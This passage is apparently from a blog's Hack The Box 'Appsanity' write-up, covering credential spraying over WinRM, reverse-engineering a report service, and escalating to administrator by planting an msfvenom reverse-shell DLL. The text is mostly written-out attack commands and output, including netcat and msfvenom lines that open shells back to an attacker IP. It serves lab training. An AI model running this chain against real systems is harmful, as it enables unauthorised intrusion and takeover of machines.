</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Users
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>03/07/2024  07:28 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>03/07/2024  07:28 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>10/18/2023  05:08 PM    &lt;DIR&gt;          Administrator
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  10:16 AM    &lt;DIR&gt;          devdoc
</span></span></span><span class=line><span class=cl><span class=go>09/15/2023  05:59 AM    &lt;DIR&gt;          Public
</span></span></span><span class=line><span class=cl><span class=go>10/18/2023  05:40 PM    &lt;DIR&gt;          svc_exampanel
</span></span></span><span class=line><span class=cl><span class=go>10/17/2023  02:05 PM    &lt;DIR&gt;          svc_meddigi
</span></span></span><span class=line><span class=cl><span class=go>10/18/2023  06:10 PM    &lt;DIR&gt;          svc_meddigiportal
</span></span></span><span class=line><span class=cl><span class=go>               0 File(s)              0 bytes
</span></span></span><span class=line><span class=cl><span class=go>               8 Dir(s)   3,995,529,216 bytes free
</span></span></span></code></pre></div><p>so I save all this users into a file and use <code>crackmapexec</code> to check if this credentials are valid for one of the users via <code>Windows Remote Management|WinRM</code> (since it was available, as the <code>Nmap</code> scan has previously shown).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ crackmapexec winrm 10.10.11.238 -u potential_users.txt -p &#39;1g0tTh3R3m3dy!!&#39; --continue-on-success
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.238    5985   NONE             [*] None (name:10.10.11.238) (domain:None)
</span></span></span><span class=line><span class=cl><span class=go>HTTP        10.10.11.238    5985   NONE             [*] http://10.10.11.238:5985/wsman
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.238    5985   NONE             [-] None\Administrator:1g0tTh3R3m3dy!!
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.238    5985   NONE             [+] None\devdoc:1g0tTh3R3m3dy!! (Pwn3d!)
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.238    5985   NONE             [-] None\svc_exampanel:1g0tTh3R3m3dy!!
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.238    5985   NONE             [-] None\svc_meddigi:1g0tTh3R3m3dy!!
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.238    5985   NONE             [-] None\svc_meddigiportal:1g0tTh3R3m3dy!!
</span></span></span></code></pre></div><p>as we can see, we have found the credentials <code>devdoc:1g0tTh3R3m3dy!!</code></p><ul><li>I log in using <code>evil-winrm</code> with this credential, but now impersonating <code>devdoc</code> user:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ evil-winrm -i 10.10.11.238 -u devdoc -p &#39;1g0tTh3R3m3dy!!&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Evil-WinRM shell v3.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Establishing connection to remote endpoint
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\devdoc\Documents&gt;
</span></span></span></code></pre></div><ul><li>After looking files I find the directory <code>C:\Program Files\ReportManagement</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Program Files\ReportManagement&gt; dir
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\Program Files\ReportManagement
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                 LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                 -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----        10/23/2023  11:33 AM                Libraries
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/5/2023   5:21 AM          34152 cryptbase.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/5/2023   5:21 AM          83744 cryptsp.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----         3/11/2021   9:22 AM         564112 msvcp140.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----         9/17/2023   3:54 AM         140512 profapi.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----        10/20/2023   2:56 PM         102912 ReportManagement.exe
</span></span></span><span class=line><span class=cl><span class=go>-a----        10/20/2023   1:47 PM       11492864 ReportManagementHelper.exe
</span></span></span><span class=line><span class=cl><span class=go>-a----         3/11/2021   9:22 AM          96144 vcruntime140.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----         3/11/2021   9:22 AM          36752 vcruntime140_1.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/5/2023   5:21 AM         179248 wldp.dll
</span></span></span></code></pre></div><ul><li>I note that this directory is interesting, since if I want to check its content as user <code>svc_exampanel</code> (the one we got from the reverse shell), we cannot check its content:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\windows\system32\inetsrv&gt;cd c:\program files
</span></span></span><span class=line><span class=cl><span class=go>cd c:\program files
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>c:\Program Files&gt;cd ReportManagement
</span></span></span><span class=line><span class=cl><span class=go>cd ReportManagement
</span></span></span><span class=line><span class=cl><span class=go>Access is denied.
</span></span></span></code></pre></div><p>since if I check its permissions with <code>icacls</code> I get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Program Files&gt;icacls ReportManagement
</span></span></span><span class=line><span class=cl><span class=go>icacls ReportManagement
</span></span></span><span class=line><span class=cl><span class=go>ReportManagement CREATOR OWNER:(OI)(CI)(IO)(F)
</span></span></span><span class=line><span class=cl><span class=go>                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                 BUILTIN\Administrators:(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                 BUILTIN\Users:(OI)(CI)(R)
</span></span></span><span class=line><span class=cl><span class=go>                 APPSANITY\devdoc:(RX)
</span></span></span><span class=line><span class=cl><span class=go>                 NT SERVICE\TrustedInstaller:(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go>                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Successfully processed 1 files; Failed processing 0 files
</span></span></span></code></pre></div><p>and, as we have already checked, <code>devdoc</code> user can read its content</p><ul><li>Back to <code>evil-winrm</code> console, I download one of the <code>.exe</code> files within this directory; called <code>ReportManagement.exe</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Program Files\ReportManagement&gt; download ReportManagement.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Downloading C:\Program Files\ReportManagement\ReportManagement.exe to ReportManagement.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Download successful!
</span></span></span></code></pre></div><ul><li>I will use <code>Ghidra</code> to decompile this binary. After a long search I find something interesting:
<img src=/pentesting/images/Appsanity_14.png alt="Analyze with Ghidra"></li><li>I note that this program creates a backup at <code>C:\Users\Administrator\Backup</code> directory:
<img src=/pentesting/images/Appsanity_15.png alt="Executable creates a backup"></li><li>And I find some interesting instructions:
<img src=/pentesting/images/Appsanity_16.png alt="Instructions for binary">
so it apparently calls a file at <code>C:\Users\Program Files\ReportManagement\Libraries</code> for a command called <code>upload</code>. Even further, this file is apparently called <code>externalupload.dll</code>:
<img src=/pentesting/images/Appsanity_17.png alt="File being called"></li><li>I check if I can write files within <code>Libraries</code> directory:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\program files\ReportManagement&gt; ls
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\program files\ReportManagement
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                 LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                 -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----        10/23/2023  11:33 AM                Libraries
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/5/2023   5:21 AM          34152 cryptbase.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/5/2023   5:21 AM          83744 cryptsp.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----         3/11/2021   9:22 AM         564112 msvcp140.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----         9/17/2023   3:54 AM         140512 profapi.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----        10/20/2023   2:56 PM         102912 ReportManagement.exe
</span></span></span><span class=line><span class=cl><span class=go>-a----        10/20/2023   1:47 PM       11492864 ReportManagementHelper.exe
</span></span></span><span class=line><span class=cl><span class=go>-a----         3/11/2021   9:22 AM          96144 vcruntime140.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----         3/11/2021   9:22 AM          36752 vcruntime140_1.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/5/2023   5:21 AM         179248 wldp.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\program files\ReportManagement&gt; icacls Libraries
</span></span></span><span class=line><span class=cl><span class=go>Libraries APPSANITY\devdoc:(OI)(CI)(RX,W)
</span></span></span><span class=line><span class=cl><span class=go>          BUILTIN\Administrators:(I)(F)
</span></span></span><span class=line><span class=cl><span class=go>          CREATOR OWNER:(I)(OI)(CI)(IO)(F)
</span></span></span><span class=line><span class=cl><span class=go>          NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>          BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
</span></span></span><span class=line><span class=cl><span class=go>          BUILTIN\Users:(I)(OI)(CI)(R)
</span></span></span><span class=line><span class=cl><span class=go>          NT SERVICE\TrustedInstaller:(I)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go>          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Successfully processed 1 files; Failed processing 0 files
</span></span></span></code></pre></div><p>and as <code>devdoc</code> user I can.</p><ul><li>If I check what ports are open inside the machine I find an unusual one:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\program files\ReportManagement\Libraries&gt; cmd /c &#39;netstat -an | find &#34;LISTENING&#34;&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:100            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  &lt;SNIP&gt;
</span></span></span></code></pre></div><p>There is a service running on port <code>100</code> internally.</p><ul><li>First, I note that it is not a website:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\program files\ReportManagement\Libraries&gt; cmd /c curl http://127.0.0.1:100
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>cmd.exe :   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span></span><span class=line><span class=cl><span class=go>    + CategoryInfo          : NotSpecified: (  % Total    % ...  Time  Current:String) [], RemoteException
</span></span></span><span class=line><span class=cl><span class=go>    + FullyQualifiedErrorId : NativeCommandError
</span></span></span><span class=line><span class=cl><span class=go>                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (1) Received HTTP/0.9 when not allowed
</span></span></span></code></pre></div><ul><li>I cannot use the <code>netcat</code> <code>Windows</code> binary I have used to pass <code>ExaminationManagement.dll</code> previously to my machine since <code>C:\Users\Public\Downloads</code> permission is denied to <code>devdoc</code> user (which is weird&mldr;), so I reupload the <code>netcat</code> binary at <code>C:\Users\devdoc\Downloads</code>.</li><li>Now I use this re-uploaded <code>netcat</code> binary, but this time against the <code>localhost</code> on port <code>100</code> and I get:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\program files\ReportManagement\Libraries&gt; C:\Users\devdoc\Downloads\nc.exe 127.0.0.1 100
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Reports Management administrative console. Type &#34;help&#34; to view available commands.
</span></span></span></code></pre></div><p>so it seems like the program we were decompiling runs on port <code>100</code>. But if I type <code>help</code> it hangs/not responds.</p><ul><li>Additionally, we need to &ldquo;trigger&rdquo; this service that is running on port <code>100</code> and also need to create a malicious file for it.</li><li>Using <code>msfvenom</code> I create a malicious <code>dll</code> file:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f dll -o externalupload.dll
</span></span></span></code></pre></div><p>in the target machine I go to <code>C:\Program Files\ReportManagement\Libraries</code> and upload that malicious file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\devdoc\Documents&gt; cd C:\&#39;program files&#39;\ReportManagement\Libraries
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\program files\ReportManagement\Libraries&gt; upload ../exploits/externalupload.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Uploading /home/gunzf0x/HTB/HTBMachines/Hard/Appsanity/content/../exploits/externalupload.dll to C:\program files\ReportManagement\Libraries\externalupload.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: 12288 bytes of 12288 bytes copied
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Upload successful!
</span></span></span></code></pre></div><ul><li>Now, we have 2 options: i) Try a <code>Remote Port Forwarding</code> to convert port <code>100</code> from the target machine to some port in our machine or, ii) More simple, I note that if I run <code>nc.exe</code> against <code>localhost</code> from <code>evil-winrm</code> console, that is a <code>Powershell</code> console, it does not work very well; so when we call <code>nc.exe 127.0.0.1 100</code> it hangs. However, If I throw a reverse shell from <code>evil-winrm</code> to a <code>netcat</code> listener to pass from <code>Powershell</code> to a <code>CMD</code> I note that running <code>nc.exe</code> against the <code>localhost</code> works fine. So I run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\devdoc\Documents&gt; C:\Users\devdoc\Downloads\nc.exe 10.10.16.6 444 -e cmd
</span></span></span></code></pre></div><p>and change from <code>Powershell</code> to <code>CMD</code>, where I can run the service running on <code>127.0.0.1:100</code> without problems:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap nc -lvnp 444
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 444 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.238] 51547
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.19045.3570]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\devdoc\Documents&gt;cd ..\Downloads
</span></span></span><span class=line><span class=cl><span class=go>cd ..\Downloads
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\devdoc\Downloads&gt;.\nc.exe 127.0.0.1 100
</span></span></span><span class=line><span class=cl><span class=go>.\nc.exe 127.0.0.1 100
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Reports Management administrative console. Type &#34;help&#34; to view available commands.
</span></span></span><span class=line><span class=cl><span class=go>help
</span></span></span><span class=line><span class=cl><span class=go>Available Commands:
</span></span></span><span class=line><span class=cl><span class=go>backup: Perform a backup operation.
</span></span></span><span class=line><span class=cl><span class=go>validate: Validates if any report has been altered since the last backup.
</span></span></span><span class=line><span class=cl><span class=go>recover &lt;filename&gt;: Restores a specified file from the backup to the Reports folder.
</span></span></span><span class=line><span class=cl><span class=go>upload &lt;external source&gt;: Uploads the reports to the specified external source.
</span></span></span></code></pre></div><ul><li>Finally, I start a <code>netcat</code> listener on port <code>443</code> (the same I had defined when I created the malicious <code>.dll</code> file), and then in the target machine I run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\program files\ReportManagement\Libraries&gt;dir
</span></span></span><span class=line><span class=cl><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is F854-971D
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\program files\ReportManagement\Libraries
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>03/07/2024  10:27 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>03/07/2024  10:27 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>03/07/2024  10:27 PM             9,216 externalupload.dll
</span></span></span><span class=line><span class=cl><span class=go>               1 File(s)          9,216 bytes
</span></span></span><span class=line><span class=cl><span class=go>               2 Dir(s)   3,994,132,480 bytes free
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\program files\ReportManagement\Libraries&gt;C:\Users\devdoc\Downloads\nc.exe 127.0.0.1 100
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\devdoc\Downloads\nc.exe 127.0.0.1 100
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Reports Management administrative console. Type &#34;help&#34; to view available commands.
</span></span></span><span class=line><span class=cl><span class=go>help
</span></span></span><span class=line><span class=cl><span class=go>Available Commands:
</span></span></span><span class=line><span class=cl><span class=go>backup: Perform a backup operation.
</span></span></span><span class=line><span class=cl><span class=go>validate: Validates if any report has been altered since the last backup.
</span></span></span><span class=line><span class=cl><span class=go>recover &lt;filename&gt;: Restores a specified file from the backup to the Reports folder.
</span></span></span><span class=line><span class=cl><span class=go>upload &lt;external source&gt;: Uploads the reports to the specified external source.
</span></span></span><span class=line><span class=cl><span class=go>upload externalupload.dll
</span></span></span></code></pre></div><ul><li>And in my <code>netcat</code> listener I finally get:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.238] 51557
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.19045.3570]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Program Files\ReportManagement&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>appsanity\administrator
</span></span></span></code></pre></div><p>where we can get the flag at <code>Administrator</code> desktop</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>